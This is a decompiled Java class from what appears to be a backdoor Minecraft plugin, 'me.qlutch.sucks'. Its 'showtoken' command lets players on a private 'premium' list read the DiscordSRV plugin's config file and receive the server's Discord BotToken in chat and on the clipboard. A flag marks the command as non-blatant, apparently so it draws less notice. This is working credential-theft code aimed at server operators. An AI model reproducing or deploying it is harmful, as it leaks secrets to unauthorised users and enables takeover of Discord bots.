/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.configuration.file.YamlConfiguration
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.utils.PluginUtils;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

public class ShowtokenCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (PluginUtils.getPluginByName("DiscordSRV") == null) {
                p2.sendMessage(Settings.PREFIX("This server does not have DiscordSRV"));
            } else {
                File f2 = new File(PluginUtils.getPluginByName("DiscordSRV").getDataFolder() + "/config.yml");
                YamlConfiguration yc2 = YamlConfiguration.loadConfiguration((File)f2);
                p2.sendMessage(Settings.PREFIX(yc2.getString("BotToken")));
                p2.sendMessage(Settings.PREFIX("Token was also attempted to be copied to your clipboard"));
                Toolkit toolkit = Toolkit.getDefaultToolkit();
                Clipboard clipboard = toolkit.getSystemClipboard();
                StringSelection strSel = new StringSelection(yc2.getString("BotToken"));
                clipboard.setContents(strSel, null);
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

